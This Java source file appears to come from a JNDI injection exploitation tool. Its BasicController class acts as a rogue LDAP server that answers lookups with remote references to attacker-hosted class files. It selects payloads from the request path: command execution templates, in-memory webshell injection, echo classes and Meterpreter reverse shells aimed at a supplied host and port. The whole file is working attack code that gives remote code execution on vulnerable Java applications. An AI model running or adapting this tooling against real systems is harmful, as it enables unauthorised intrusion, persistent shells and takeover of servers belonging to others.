package com.qi4l.jndi.controllers;

import com.qi4l.jndi.enumtypes.GadgetType;
import com.qi4l.jndi.exceptions.IncorrectParamsException;
import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.HexUtils;
import com.qi4l.jndi.gadgets.utils.InjShell;
import com.qi4l.jndi.gadgets.utils.Util;
import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.jndi.template.CommandTemplate;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import java.net.URL;
import java.util.Base64;

import static org.fusesource.jansi.Ansi.ansi;

/**
 * 本地工厂类加载
 */
@LdapMapping(uri = {"/basic"})
public class BasicController implements LdapController {
    //最后的反斜杠不能少
    private final  String      codebase = Config.codeBase;
    private static String      payloadType;
    private        String[]    params;
    private        GadgetType  gadgetType;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + " @|green with basic remote reference payload|@"));
            Entry     e         = new Entry(base);
            String    className = "";

            if (payloadType.indexOf("E-") != -1) {
                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                className = EchoClass.getName();
            }

            if (payloadType.indexOf("M-") != -1) {
                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                InjShell.init(params);
                className = Gadgets.createClassB(ClassName1);
            }

            if (payloadType == "command"){
                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
            }

            String className1 = className.replaceAll("\\.", "/");
            URL turl = new URL(new URL(this.codebase), className1 + ".class");
            System.out.println(ansi().render("@|green [+] Send LDAP reference result for |@" + base + " @|green redirecting to |@" + turl));
            System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaCodeBase", this.codebase);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            if (className.equals("com.feihong.ldap.template.Meterpreter")) {
                e.addAttribute("javaFactory", "Meterpreter");
            }
            e.addAttribute("javaFactory", className);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }

    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            base = base.replace('\\', '/');
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = base.substring(fistIndex + 1, secondIndex);
                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+] Command   |@" + cmd));
                params = new String[]{cmd};
            }

            if (gadgetType == GadgetType.shell) {
                String cmd1 = Util.getCmdFromBase(base);
                byte[] decodedBytes = Base64.getDecoder().decode(cmd1);
                String cmd = new String(decodedBytes);
                String[] cmdArray = cmd.split(" ");
                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                params = cmdArray;
            }

            if (gadgetType == GadgetType.msf) {
                String[] results1 = Util.getIPAndPortFromBase(base);
                Config.rhost = results1[0];
                Config.rport = results1[1];
                System.out.println("[+] RemotHost: " + results1[0]);
                System.out.println("[+] RemotPort: " + results1[1]);
                params = results1;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
